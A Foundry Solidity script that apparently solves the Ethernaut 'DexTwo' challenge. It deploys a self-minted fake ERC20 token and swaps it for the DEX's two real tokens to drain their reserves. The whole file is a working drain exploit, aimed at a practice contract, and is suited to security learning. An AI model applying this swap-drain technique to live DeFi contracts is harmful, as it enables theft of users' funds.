// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/DexTwo.sol";
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract DexTwoScript is Script {

    DexTwo target;
    address token1;
    address token2;
    uint256 count;
    ERC20 moojiToken;

    function setUp() public {


        target = DexTwo(0xB2cD5C81C55196b31533fdDc6e33a522252b6F15);
        token1 = target.token1();
        token2 = target.token2();
        
        console.log("---------------------------------------------");
        console.log("intial token1 amount: ", target.balanceOf(token1, address(target)));
        console.log("intial token2 amount: ", target.balanceOf(token2, address(target)));
    }

    function run() public {
        vm.startBroadcast();

        moojiToken = new MoojiToken(address(target), "Mooji", "MJT", 100);

        console.log("moojiToken : ", address(moojiToken));
        console.log("script address : ", address(this));
        console.log("---------------------------------------------");
        console.log("intial mooji Token amount: ", moojiToken.balanceOf(0xB0fDe4E4A8e8Bdf0A8Aea00f33f2428073cAF93C));
        
        target.approve(address(target), type(uint256).max);
        moojiToken.approve(address(target), type(uint256).max);

        // swap
        target.swap(address(moojiToken), token1, 100);
        target.swap(address(moojiToken), token2, 200);
        
        console.log("[+] final token1 amount: ", target.balanceOf(token1, address(target)));
        console.log("[+] fianl token2 amount: ", target.balanceOf(token2, address(target)));
        console.log("[+] final mooji Token amount: ", moojiToken.balanceOf(0xB0fDe4E4A8e8Bdf0A8Aea00f33f2428073cAF93C));

        vm.stopBroadcast();
    }

}

contract MoojiToken is ERC20 {
    constructor(address minter, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(minter, initialSupply);
        _mint(0xB0fDe4E4A8e8Bdf0A8Aea00f33f2428073cAF93C, 1000000000);
    }
}